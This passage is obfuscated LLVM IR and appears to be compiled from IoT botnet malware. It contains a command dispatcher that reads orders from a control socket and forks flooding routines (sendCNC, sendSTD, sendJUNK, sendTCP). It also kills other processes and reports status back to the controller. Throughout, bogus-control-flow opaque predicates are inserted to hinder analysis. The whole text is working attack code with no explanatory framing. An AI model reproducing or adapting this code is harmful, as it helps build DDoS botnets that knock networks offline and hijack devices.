  %1210 = icmp eq i32 %1209, 0
  %1211 = icmp slt i32 %1206, 10
  %1212 = or i1 %1210, %1211
  br i1 %1212, label %originalBB150, label %originalBB150alteredBB

originalBB150:                                    ; preds = %originalBB150alteredBB, %1204
  %1213 = load i8*, i8** %45, align 8
  %1214 = icmp ne i8* %1213, null
  %1215 = load i32, i32* @x.77
  %1216 = load i32, i32* @y.78
  %1217 = sub i32 %1215, 1
  %1218 = mul i32 %1215, %1217
  %1219 = urem i32 %1218, 2
  %1220 = icmp eq i32 %1219, 0
  %1221 = icmp slt i32 %1216, 10
  %1222 = or i1 %1220, %1221
  br i1 %1222, label %originalBBpart2152, label %originalBB150alteredBB

originalBBpart2152:                               ; preds = %originalBB150
  br i1 %1214, label %1223, label %1250

; <label>:1223:                                   ; preds = %originalBBpart2152
  %1224 = call i32 @listFork()
  %1225 = icmp ne i32 %1224, 0
  br i1 %1225, label %1248, label %1226

; <label>:1226:                                   ; preds = %1223
  %1227 = load i32, i32* @x.77
  %1228 = load i32, i32* @y.78
  %1229 = sub i32 %1227, 1
  %1230 = mul i32 %1227, %1229
  %1231 = urem i32 %1230, 2
  %1232 = icmp eq i32 %1231, 0
  %1233 = icmp slt i32 %1228, 10
  %1234 = or i1 %1232, %1233
  br i1 %1234, label %originalBB154, label %originalBB154alteredBB

originalBB154:                                    ; preds = %originalBB154alteredBB, %1226
  %1235 = load i8*, i8** %45, align 8
  %1236 = load i32, i32* %43, align 4
  %1237 = load i32, i32* %44, align 4
  call void @sendCNC(i8* %1235, i32 %1236, i32 %1237)
  %1238 = load i32, i32* @mainCommSock, align 4
  %1239 = call i32 @close(i32 %1238)
  call void @_exit(i32 0) #12
  %1240 = load i32, i32* @x.77
  %1241 = load i32, i32* @y.78
  %1242 = sub i32 %1240, 1
  %1243 = mul i32 %1240, %1242
  %1244 = urem i32 %1243, 2
  %1245 = icmp eq i32 %1244, 0
  %1246 = icmp slt i32 %1241, 10
  %1247 = or i1 %1245, %1246
  br i1 %1247, label %originalBBpart2156, label %originalBB154alteredBB

originalBBpart2156:                               ; preds = %originalBB154
  unreachable

; <label>:1248:                                   ; preds = %1223
  %1249 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %1249, i8** %45, align 8
  br label %1204

; <label>:1250:                                   ; preds = %originalBBpart2152
  br label %1307

; <label>:1251:                                   ; preds = %1170
  %1252 = load i32, i32* @x.77
  %1253 = load i32, i32* @y.78
  %1254 = sub i32 %1252, 1
  %1255 = mul i32 %1252, %1254
  %1256 = urem i32 %1255, 2
  %1257 = icmp eq i32 %1256, 0
  %1258 = icmp slt i32 %1253, 10
  %1259 = or i1 %1257, %1258
  br i1 %1259, label %originalBB158, label %originalBB158alteredBB

originalBB158:                                    ; preds = %originalBB158alteredBB, %1251
  %1260 = call i32 @listFork()
  %1261 = icmp ne i32 %1260, 0
  %1262 = load i32, i32* @x.77
  %1263 = load i32, i32* @y.78
  %1264 = sub i32 %1262, 1
  %1265 = mul i32 %1262, %1264
  %1266 = urem i32 %1265, 2
  %1267 = icmp eq i32 %1266, 0
  %1268 = icmp slt i32 %1263, 10
  %1269 = or i1 %1267, %1268
  br i1 %1269, label %originalBBpart2160, label %originalBB158alteredBB

originalBBpart2160:                               ; preds = %originalBB158
  br i1 %1261, label %1270, label %1287

; <label>:1270:                                   ; preds = %originalBBpart2160
  %1271 = load i32, i32* @x.77
  %1272 = load i32, i32* @y.78
  %1273 = sub i32 %1271, 1
  %1274 = mul i32 %1271, %1273
  %1275 = urem i32 %1274, 2
  %1276 = icmp eq i32 %1275, 0
  %1277 = icmp slt i32 %1272, 10
  %1278 = or i1 %1276, %1277
  br i1 %1278, label %originalBB162, label %originalBB162alteredBB

originalBB162:                                    ; preds = %originalBB162alteredBB, %1270
  %1279 = load i32, i32* @x.77
  %1280 = load i32, i32* @y.78
  %1281 = sub i32 %1279, 1
  %1282 = mul i32 %1279, %1281
  %1283 = urem i32 %1282, 2
  %1284 = icmp eq i32 %1283, 0
  %1285 = icmp slt i32 %1280, 10
  %1286 = or i1 %1284, %1285
  br i1 %1286, label %originalBBpart2164, label %originalBB162alteredBB

originalBBpart2164:                               ; preds = %originalBB162
  br label %1553

; <label>:1287:                                   ; preds = %originalBBpart2160
  %1288 = load i32, i32* @x.77
  %1289 = load i32, i32* @y.78
  %1290 = sub i32 %1288, 1
  %1291 = mul i32 %1288, %1290
  %1292 = urem i32 %1291, 2
  %1293 = icmp eq i32 %1292, 0
  %1294 = icmp slt i32 %1289, 10
  %1295 = or i1 %1293, %1294
  br i1 %1295, label %originalBB166, label %originalBB166alteredBB

originalBB166:                                    ; preds = %originalBB166alteredBB, %1287
  %1296 = load i8*, i8** %42, align 8
  %1297 = load i32, i32* %43, align 4
  %1298 = load i32, i32* %44, align 4
  call void @sendCNC(i8* %1296, i32 %1297, i32 %1298)
  call void @_exit(i32 0) #12
  %1299 = load i32, i32* @x.77
  %1300 = load i32, i32* @y.78
  %1301 = sub i32 %1299, 1
  %1302 = mul i32 %1299, %1301
  %1303 = urem i32 %1302, 2
  %1304 = icmp eq i32 %1303, 0
  %1305 = icmp slt i32 %1300, 10
  %1306 = or i1 %1304, %1305
  br i1 %1306, label %originalBBpart2168, label %originalBB166alteredBB

originalBBpart2168:                               ; preds = %originalBB166
  unreachable

; <label>:1307:                                   ; preds = %1250
  br label %1553

; <label>:1308:                                   ; preds = %1116
  %1309 = load i8**, i8*** %12, align 8
  %1310 = getelementptr inbounds i8*, i8** %1309, i64 0
  %1311 = load i8*, i8** %1310, align 8
  %1312 = call i32 @strcmp(i8* %1311, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.124, i32 0, i32 0)) #10
  %1313 = icmp ne i32 %1312, 0
  br i1 %1313, label %1410, label %1314

; <label>:1314:                                   ; preds = %1308
  %1315 = load i32, i32* %11, align 4
  %1316 = icmp slt i32 %1315, 4
  br i1 %1316, label %1329, label %1317

; <label>:1317:                                   ; preds = %1314
  %1318 = load i8**, i8*** %12, align 8
  %1319 = getelementptr inbounds i8*, i8** %1318, i64 2
  %1320 = load i8*, i8** %1319, align 8
  %1321 = call i32 @atoi(i8* %1320) #10
  %1322 = icmp slt i32 %1321, 1
  br i1 %1322, label %1329, label %1323

; <label>:1323:                                   ; preds = %1317
  %1324 = load i8**, i8*** %12, align 8
  %1325 = getelementptr inbounds i8*, i8** %1324, i64 3
  %1326 = load i8*, i8** %1325, align 8
  %1327 = call i32 @atoi(i8* %1326) #10
  %1328 = icmp slt i32 %1327, 1
  br i1 %1328, label %1329, label %1346

; <label>:1329:                                   ; preds = %1323, %1317, %1314
  %1330 = load i32, i32* @x.77
  %1331 = load i32, i32* @y.78
  %1332 = sub i32 %1330, 1
  %1333 = mul i32 %1330, %1332
  %1334 = urem i32 %1333, 2
  %1335 = icmp eq i32 %1334, 0
  %1336 = icmp slt i32 %1331, 10
  %1337 = or i1 %1335, %1336
  br i1 %1337, label %originalBB170, label %originalBB170alteredBB

originalBB170:                                    ; preds = %originalBB170alteredBB, %1329
  %1338 = load i32, i32* @x.77
  %1339 = load i32, i32* @y.78
  %1340 = sub i32 %1338, 1
  %1341 = mul i32 %1338, %1340
  %1342 = urem i32 %1341, 2
  %1343 = icmp eq i32 %1342, 0
  %1344 = icmp slt i32 %1339, 10
  %1345 = or i1 %1343, %1344
  br i1 %1345, label %originalBBpart2172, label %originalBB170alteredBB

originalBBpart2172:                               ; preds = %originalBB170
  br label %1553

; <label>:1346:                                   ; preds = %1323
  %1347 = load i8**, i8*** %12, align 8
  %1348 = getelementptr inbounds i8*, i8** %1347, i64 1
  %1349 = load i8*, i8** %1348, align 8
  store i8* %1349, i8** %46, align 8
  %1350 = load i8**, i8*** %12, align 8
  %1351 = getelementptr inbounds i8*, i8** %1350, i64 2
  %1352 = load i8*, i8** %1351, align 8
  %1353 = call i32 @atoi(i8* %1352) #10
  store i32 %1353, i32* %47, align 4
  %1354 = load i8**, i8*** %12, align 8
  %1355 = getelementptr inbounds i8*, i8** %1354, i64 3
  %1356 = load i8*, i8** %1355, align 8
  %1357 = call i32 @atoi(i8* %1356) #10
  store i32 %1357, i32* %48, align 4
  %1358 = load i8*, i8** %46, align 8
  %1359 = call i8* @strstr(i8* %1358, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #10
  %1360 = icmp ne i8* %1359, null
  br i1 %1360, label %1361, label %1405

; <label>:1361:                                   ; preds = %1346
  %1362 = load i8*, i8** %46, align 8
  %1363 = call i8* @strtok(i8* %1362, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %1363, i8** %49, align 8
  br label %1364

; <label>:1364:                                   ; preds = %originalBBpart2180, %1361
  %1365 = load i32, i32* @x.77
  %1366 = load i32, i32* @y.78
  %1367 = sub i32 %1365, 1
  %1368 = mul i32 %1365, %1367
  %1369 = urem i32 %1368, 2
  %1370 = icmp eq i32 %1369, 0
  %1371 = icmp slt i32 %1366, 10
  %1372 = or i1 %1370, %1371
  br i1 %1372, label %originalBB174, label %originalBB174alteredBB

originalBB174:                                    ; preds = %originalBB174alteredBB, %1364
  %1373 = load i8*, i8** %49, align 8
  %1374 = icmp ne i8* %1373, null
  %1375 = load i32, i32* @x.77
  %1376 = load i32, i32* @y.78
  %1377 = sub i32 %1375, 1
  %1378 = mul i32 %1375, %1377
  %1379 = urem i32 %1378, 2
  %1380 = icmp eq i32 %1379, 0
  %1381 = icmp slt i32 %1376, 10
  %1382 = or i1 %1380, %1381
  br i1 %1382, label %originalBBpart2176, label %originalBB174alteredBB

originalBBpart2176:                               ; preds = %originalBB174
  br i1 %1374, label %1383, label %1404

; <label>:1383:                                   ; preds = %originalBBpart2176
  %1384 = load i32, i32* @x.77
  %1385 = load i32, i32* @y.78
  %1386 = sub i32 %1384, 1
  %1387 = mul i32 %1384, %1386
  %1388 = urem i32 %1387, 2
  %1389 = icmp eq i32 %1388, 0
  %1390 = icmp slt i32 %1385, 10
  %1391 = or i1 %1389, %1390
  br i1 %1391, label %originalBB178, label %originalBB178alteredBB

originalBB178:                                    ; preds = %originalBB178alteredBB, %1383
  %1392 = load i8*, i8** %49, align 8
  %1393 = load i32, i32* %47, align 4
  %1394 = load i32, i32* %48, align 4
  call void @sendSTD(i8* %1392, i32 %1393, i32 %1394)
  %1395 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %1395, i8** %49, align 8
  %1396 = load i32, i32* @x.77
  %1397 = load i32, i32* @y.78
  %1398 = sub i32 %1396, 1
  %1399 = mul i32 %1396, %1398
  %1400 = urem i32 %1399, 2
  %1401 = icmp eq i32 %1400, 0
  %1402 = icmp slt i32 %1397, 10
  %1403 = or i1 %1401, %1402
  br i1 %1403, label %originalBBpart2180, label %originalBB178alteredBB

originalBBpart2180:                               ; preds = %originalBB178
  br label %1364

; <label>:1404:                                   ; preds = %originalBBpart2176
  br label %1409

; <label>:1405:                                   ; preds = %1346
  %1406 = load i8*, i8** %46, align 8
  %1407 = load i32, i32* %47, align 4
  %1408 = load i32, i32* %48, align 4
  call void @sendSTD(i8* %1406, i32 %1407, i32 %1408)
  br label %1409

; <label>:1409:                                   ; preds = %1405, %1404
  br label %1553

; <label>:1410:                                   ; preds = %1308
  %1411 = load i32, i32* @x.77
  %1412 = load i32, i32* @y.78
  %1413 = sub i32 %1411, 1
  %1414 = mul i32 %1411, %1413
  %1415 = urem i32 %1414, 2
  %1416 = icmp eq i32 %1415, 0
  %1417 = icmp slt i32 %1412, 10
  %1418 = or i1 %1416, %1417
  br i1 %1418, label %originalBB182, label %originalBB182alteredBB

originalBB182:                                    ; preds = %originalBB182alteredBB, %1410
  %1419 = load i8**, i8*** %12, align 8
  %1420 = getelementptr inbounds i8*, i8** %1419, i64 0
  %1421 = load i8*, i8** %1420, align 8
  %1422 = call i32 @strcmp(i8* %1421, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.125, i32 0, i32 0)) #10
  %1423 = icmp ne i32 %1422, 0
  %1424 = load i32, i32* @x.77
  %1425 = load i32, i32* @y.78
  %1426 = sub i32 %1424, 1
  %1427 = mul i32 %1424, %1426
  %1428 = urem i32 %1427, 2
  %1429 = icmp eq i32 %1428, 0
  %1430 = icmp slt i32 %1425, 10
  %1431 = or i1 %1429, %1430
  br i1 %1431, label %originalBBpart2184, label %originalBB182alteredBB

originalBBpart2184:                               ; preds = %originalBB182
  br i1 %1423, label %1553, label %1432

; <label>:1432:                                   ; preds = %originalBBpart2184
  store i32 0, i32* %50, align 4
  store i64 0, i64* %51, align 8
  br label %1433

; <label>:1433:                                   ; preds = %originalBBpart2196, %1432
  %1434 = load i32, i32* @x.77
  %1435 = load i32, i32* @y.78
  %1436 = sub i32 %1434, 1
  %1437 = mul i32 %1434, %1436
  %1438 = urem i32 %1437, 2
  %1439 = icmp eq i32 %1438, 0
  %1440 = icmp slt i32 %1435, 10
  %1441 = or i1 %1439, %1440
  br i1 %1441, label %originalBB186, label %originalBB186alteredBB

originalBB186:                                    ; preds = %originalBB186alteredBB, %1433
  %1442 = load i64, i64* %51, align 8
  %1443 = load i64, i64* @numpids, align 8
  %1444 = icmp ult i64 %1442, %1443
  %1445 = load i32, i32* @x.77
  %1446 = load i32, i32* @y.78
  %1447 = sub i32 %1445, 1
  %1448 = mul i32 %1445, %1447
  %1449 = urem i32 %1448, 2
  %1450 = icmp eq i32 %1449, 0
  %1451 = icmp slt i32 %1446, 10
  %1452 = or i1 %1450, %1451
  br i1 %1452, label %originalBBpart2188, label %originalBB186alteredBB

originalBBpart2188:                               ; preds = %originalBB186
  br i1 %1444, label %1453, label %1510

; <label>:1453:                                   ; preds = %originalBBpart2188
  %1454 = load i32, i32* @x.77
  %1455 = load i32, i32* @y.78
  %1456 = sub i32 %1454, 1
  %1457 = mul i32 %1454, %1456
  %1458 = urem i32 %1457, 2
  %1459 = icmp eq i32 %1458, 0
  %1460 = icmp slt i32 %1455, 10
  %1461 = or i1 %1459, %1460
  br i1 %1461, label %originalBB190, label %originalBB190alteredBB

originalBB190:                                    ; preds = %originalBB190alteredBB, %1453
  %1462 = load i32*, i32** @pids, align 8
  %1463 = load i64, i64* %51, align 8
  %1464 = getelementptr inbounds i32, i32* %1462, i64 %1463
  %1465 = load i32, i32* %1464, align 4
  %1466 = icmp ne i32 %1465, 0
  %1467 = load i32, i32* @x.77
  %1468 = load i32, i32* @y.78
  %1469 = sub i32 %1467, 1
  %1470 = mul i32 %1467, %1469
  %1471 = urem i32 %1470, 2
  %1472 = icmp eq i32 %1471, 0
  %1473 = icmp slt i32 %1468, 10
  %1474 = or i1 %1472, %1473
  br i1 %1474, label %originalBBpart2192, label %originalBB190alteredBB

originalBBpart2192:                               ; preds = %originalBB190
  br i1 %1466, label %1475, label %1490

; <label>:1475:                                   ; preds = %originalBBpart2192
  %1476 = load i32*, i32** @pids, align 8
  %1477 = load i64, i64* %51, align 8
  %1478 = getelementptr inbounds i32, i32* %1476, i64 %1477
  %1479 = load i32, i32* %1478, align 4
  %1480 = call i32 @getpid() #2
  %1481 = icmp ne i32 %1479, %1480
  br i1 %1481, label %1482, label %1490

; <label>:1482:                                   ; preds = %1475
  %1483 = load i32*, i32** @pids, align 8
  %1484 = load i64, i64* %51, align 8
  %1485 = getelementptr inbounds i32, i32* %1483, i64 %1484
  %1486 = load i32, i32* %1485, align 4
  %1487 = call i32 @kill(i32 %1486, i32 9) #2
  %1488 = load i32, i32* %50, align 4
  %1489 = add nsw i32 %1488, 1
  store i32 %1489, i32* %50, align 4
  br label %1490

; <label>:1490:                                   ; preds = %1482, %1475, %originalBBpart2192
  br label %1491

; <label>:1491:                                   ; preds = %1490
  %1492 = load i32, i32* @x.77
  %1493 = load i32, i32* @y.78
  %1494 = sub i32 %1492, 1
  %1495 = mul i32 %1492, %1494
  %1496 = urem i32 %1495, 2
  %1497 = icmp eq i32 %1496, 0
  %1498 = icmp slt i32 %1493, 10
  %1499 = or i1 %1497, %1498
  br i1 %1499, label %originalBB194, label %originalBB194alteredBB

originalBB194:                                    ; preds = %originalBB194alteredBB, %1491
  %1500 = load i64, i64* %51, align 8
  %1501 = add i64 %1500, 1
  store i64 %1501, i64* %51, align 8
  %1502 = load i32, i32* @x.77
  %1503 = load i32, i32* @y.78
  %1504 = sub i32 %1502, 1
  %1505 = mul i32 %1502, %1504
  %1506 = urem i32 %1505, 2
  %1507 = icmp eq i32 %1506, 0
  %1508 = icmp slt i32 %1503, 10
  %1509 = or i1 %1507, %1508
  br i1 %1509, label %originalBBpart2196, label %originalBB194alteredBB

originalBBpart2196:                               ; preds = %originalBB194
  br label %1433

; <label>:1510:                                   ; preds = %originalBBpart2188
  %1511 = load i32, i32* %50, align 4
  %1512 = icmp sgt i32 %1511, 0
  br i1 %1512, label %1513, label %1533

; <label>:1513:                                   ; preds = %1510
  %1514 = load i32, i32* @x.77
  %1515 = load i32, i32* @y.78
  %1516 = sub i32 %1514, 1
  %1517 = mul i32 %1514, %1516
  %1518 = urem i32 %1517, 2
  %1519 = icmp eq i32 %1518, 0
  %1520 = icmp slt i32 %1515, 10
  %1521 = or i1 %1519, %1520
  br i1 %1521, label %originalBB198, label %originalBB198alteredBB

originalBB198:                                    ; preds = %originalBB198alteredBB, %1513
  %1522 = load i32, i32* @mainCommSock, align 4
  %1523 = load i32, i32* %50, align 4
  %1524 = call i32 (i32, i8*, ...) @sockprintf(i32 %1522, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.126, i32 0, i32 0), i32 %1523)
  %1525 = load i32, i32* @x.77
  %1526 = load i32, i32* @y.78
  %1527 = sub i32 %1525, 1
  %1528 = mul i32 %1525, %1527
  %1529 = urem i32 %1528, 2
  %1530 = icmp eq i32 %1529, 0
  %1531 = icmp slt i32 %1526, 10
  %1532 = or i1 %1530, %1531
  br i1 %1532, label %originalBBpart2200, label %originalBB198alteredBB

originalBBpart2200:                               ; preds = %originalBB198
  br label %1552

; <label>:1533:                                   ; preds = %1510
  %1534 = load i32, i32* @x.77
  %1535 = load i32, i32* @y.78
  %1536 = sub i32 %1534, 1
  %1537 = mul i32 %1534, %1536
  %1538 = urem i32 %1537, 2
  %1539 = icmp eq i32 %1538, 0
  %1540 = icmp slt i32 %1535, 10
  %1541 = or i1 %1539, %1540
  br i1 %1541, label %originalBB202, label %originalBB202alteredBB

originalBB202:                                    ; preds = %originalBB202alteredBB, %1533
  %1542 = load i32, i32* @mainCommSock, align 4
  %1543 = call i32 (i32, i8*, ...) @sockprintf(i32 %1542, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.127, i32 0, i32 0))
  %1544 = load i32, i32* @x.77
  %1545 = load i32, i32* @y.78
  %1546 = sub i32 %1544, 1
  %1547 = mul i32 %1544, %1546
  %1548 = urem i32 %1547, 2
  %1549 = icmp eq i32 %1548, 0
  %1550 = icmp slt i32 %1545, 10
  %1551 = or i1 %1549, %1550
  br i1 %1551, label %originalBBpart2204, label %originalBB202alteredBB

originalBBpart2204:                               ; preds = %originalBB202
  br label %1552

; <label>:1552:                                   ; preds = %originalBBpart2204, %originalBBpart2200
  br label %1553

; <label>:1553:                                   ; preds = %1552, %originalBBpart2184, %1409, %originalBBpart2172, %1307, %originalBBpart2164, %1169, %originalBBpart2136, %1035, %originalBBpart2116, %810, %originalBBpart272, %526, %originalBBpart244, %380, %327, %originalBBpart228, %268, %233, %originalBBpart224, %184, %originalBBpart24
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %1554 = alloca i32, align 4
  %1555 = alloca i8**, align 8
  %1556 = alloca i8*, align 8
  %1557 = alloca i32, align 4
  %1558 = alloca i32, align 4
  %1559 = alloca i8*, align 8
  %1560 = alloca i8*, align 8
  %1561 = alloca i32, align 4
  %1562 = alloca i32, align 4
  %1563 = alloca i8*, align 8
  %1564 = alloca i8*, align 8
  %1565 = alloca i32, align 4
  %1566 = alloca i32, align 4
  %1567 = alloca i32, align 4
  %1568 = alloca i32, align 4
  %1569 = alloca i32, align 4
  %1570 = alloca i32, align 4
  %1571 = alloca i32, align 4
  %1572 = alloca i8*, align 8
  %1573 = alloca i8*, align 8
  %1574 = alloca i32, align 4
  %1575 = alloca i32, align 4
  %1576 = alloca i32, align 4
  %1577 = alloca i8*, align 8
  %1578 = alloca i32, align 4
  %1579 = alloca i32, align 4
  %1580 = alloca i8*, align 8
  %1581 = alloca i8*, align 8
  %1582 = alloca i32, align 4
  %1583 = alloca i32, align 4
  %1584 = alloca i8*, align 8
  %1585 = alloca i8*, align 8
  %1586 = alloca i32, align 4
  %1587 = alloca i32, align 4
  %1588 = alloca i8*, align 8
  %1589 = alloca i8*, align 8
  %1590 = alloca i32, align 4
  %1591 = alloca i32, align 4
  %1592 = alloca i8*, align 8
  %1593 = alloca i32, align 4
  %1594 = alloca i64, align 8
  store i32 %0, i32* %1554, align 4
  store i8** %1, i8*** %1555, align 8
  %1595 = load i8**, i8*** %1555, align 8
  %1596 = getelementptr inbounds i8*, i8** %1595, i64 0
  %1597 = load i8*, i8** %1596, align 8
  %1598 = call i32 @strcmp(i8* %1597, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i32 0, i32 0)) #10
  %1599 = icmp ne i32 %1598, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %65
  %1600 = load i32, i32* @mainCommSock, align 4
  %1601 = call i32 (i32, i8*, ...) @sockprintf(i32 %1600, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.109, i32 0, i32 0))
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %84
  %1602 = load i8**, i8*** %12, align 8
  %1603 = getelementptr inbounds i8*, i8** %1602, i64 0
  %1604 = load i8*, i8** %1603, align 8
  %1605 = call i32 @strcmp(i8* %1604, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.110, i32 0, i32 0)) #10
  %1606 = icmp ne i32 %1605, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %110
  %1607 = load i8**, i8*** %12, align 8
  %1608 = getelementptr inbounds i8*, i8** %1607, i64 0
  %1609 = load i8*, i8** %1608, align 8
  %1610 = call i32 @strcmp(i8* %1609, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.111, i32 0, i32 0)) #10
  %1611 = icmp ne i32 %1610, 0
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %132
  %1612 = load i8**, i8*** %12, align 8
  %1613 = getelementptr inbounds i8*, i8** %1612, i64 1
  %1614 = load i8*, i8** %1613, align 8
  %1615 = call i32 @strcmp(i8* %1614, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.112, i32 0, i32 0)) #10
  %1616 = icmp ne i32 %1615, 0
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %154
  %1617 = call i32 (...) @killer_kill()
  %1618 = load i32, i32* @mainCommSock, align 4
  %1619 = call i32 (i32, i8*, ...) @sockprintf(i32 %1618, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.113, i32 0, i32 0))
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %191
  %1620 = load i32, i32* @mainCommSock, align 4
  %1621 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %1622 = call i8* @inet_ntoa(i32 %1621) #2
  %1623 = call i32 (i32, i8*, ...) @sockprintf(i32 %1620, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.117, i32 0, i32 0), i8* %1622)
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %273
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %299
  %1624 = load i8**, i8*** %12, align 8
  %1625 = getelementptr inbounds i8*, i8** %1624, i64 2
  %1626 = load i8*, i8** %1625, align 8
  %1627 = call i32 @atoi(i8* %1626) #10
  %1628 = icmp slt i32 %1627, 1
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %349
  %1629 = call i32 @listFork()
  %1630 = icmp ne i32 %1629, 0
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %381
  %1631 = load i8*, i8** %17, align 8
  %1632 = load i32, i32* %18, align 4
  %1633 = load i32, i32* %19, align 4
  call void @sendJUNK(i8* %1631, i32 %1632, i32 %1633)
  call void @_exit(i32 0) #12
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %401
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %427
  %1634 = load i8**, i8*** %12, align 8
  %1635 = getelementptr inbounds i8*, i8** %1634, i64 3
  %1636 = load i8*, i8** %1635, align 8
  %1637 = call i32 @atoi(i8* %1636) #10
  %1638 = icmp eq i32 %1637, -1
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %449
  %1639 = load i8**, i8*** %12, align 8
  %1640 = getelementptr inbounds i8*, i8** %1639, i64 2
  %1641 = load i8*, i8** %1640, align 8
  %1642 = call i32 @atoi(i8* %1641) #10
  %1643 = icmp eq i32 %1642, -1
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %495
  %1644 = load i8**, i8*** %12, align 8
  %1645 = getelementptr inbounds i8*, i8** %1644, i64 4
  %1646 = load i8*, i8** %1645, align 8
  %1647 = call i32 @atoi(i8* %1646) #10
  %1648 = icmp sgt i32 %1647, 32
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %549
  %1649 = load i8**, i8*** %12, align 8
  %1650 = getelementptr inbounds i8*, i8** %1649, i64 6
  %1651 = load i8*, i8** %1650, align 8
  %1652 = call i32 @atoi(i8* %1651) #10
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %570
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %612
  %1653 = load i8*, i8** %21, align 8
  %1654 = call i8* @strtok(i8* %1653, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %1654, i8** %29, align 8
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %662
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %679
  %1655 = load i8**, i8*** %12, align 8
  %1656 = getelementptr inbounds i8*, i8** %1655, i64 0
  %1657 = load i8*, i8** %1656, align 8
  %1658 = call i32 @strcmp(i8* %1657, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.121, i32 0, i32 0)) #10
  %1659 = icmp ne i32 %1658, 0
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %701
  %1660 = load i32, i32* %11, align 4
  %1661 = icmp slt i32 %1660, 6
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %726
  %1662 = load i8**, i8*** %12, align 8
  %1663 = getelementptr inbounds i8*, i8** %1662, i64 2
  %1664 = load i8*, i8** %1663, align 8
  %1665 = call i32 @atoi(i8* %1664) #10
  %1666 = icmp eq i32 %1665, -1
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %748
  %1667 = load i8**, i8*** %12, align 8
  %1668 = getelementptr inbounds i8*, i8** %1667, i64 4
  %1669 = load i8*, i8** %1668, align 8
  %1670 = call i32 @atoi(i8* %1669) #10
  %1671 = icmp eq i32 %1670, -1
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %776
  %1672 = load i32, i32* %11, align 4
  %1673 = icmp sgt i32 %1672, 6
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %838
  store i32 %839, i32* %35, align 4
  %1674 = load i32, i32* %11, align 4
  %1675 = icmp sgt i32 %1674, 6
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %875
  %1676 = call i32 @listFork()
  %1677 = icmp ne i32 %1676, 0
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %894
  %1678 = load i8*, i8** %37, align 8
  %1679 = load i32, i32* %31, align 4
  %1680 = load i32, i32* %32, align 4
  %1681 = load i32, i32* %33, align 4
  %1682 = load i8*, i8** %34, align 8
  %1683 = load i32, i32* %36, align 4
  %1684 = load i32, i32* %35, align 4
  call void @sendTCP(i8* %1678, i32 %1679, i32 %1680, i32 %1681, i8* %1682, i32 %1683, i32 %1684)
  call void @_exit(i32 0) #12
  br label %originalBB102

originalBB106alteredBB:                           ; preds = %originalBB106, %921
  %1685 = call i32 @listFork()
  %1686 = icmp ne i32 %1685, 0
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %940
  %1687 = load i8*, i8** %30, align 8
  %1688 = load i32, i32* %31, align 4
  %1689 = load i32, i32* %32, align 4
  %1690 = load i32, i32* %33, align 4
  %1691 = load i8*, i8** %34, align 8
  %1692 = load i32, i32* %36, align 4
  %1693 = load i32, i32* %35, align 4
  call void @sendTCP(i8* %1687, i32 %1688, i32 %1689, i32 %1690, i8* %1691, i32 %1692, i32 %1693)
  call void @_exit(i32 0) #12
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %965
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %982
  %1694 = load i8**, i8*** %12, align 8
  %1695 = getelementptr inbounds i8*, i8** %1694, i64 0
  %1696 = load i8*, i8** %1695, align 8
  %1697 = call i32 @strcmp(i8* %1696, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.122, i32 0, i32 0)) #10
  %1698 = icmp ne i32 %1697, 0
  br label %originalBB118

originalBB122alteredBB:                           ; preds = %originalBB122, %1013
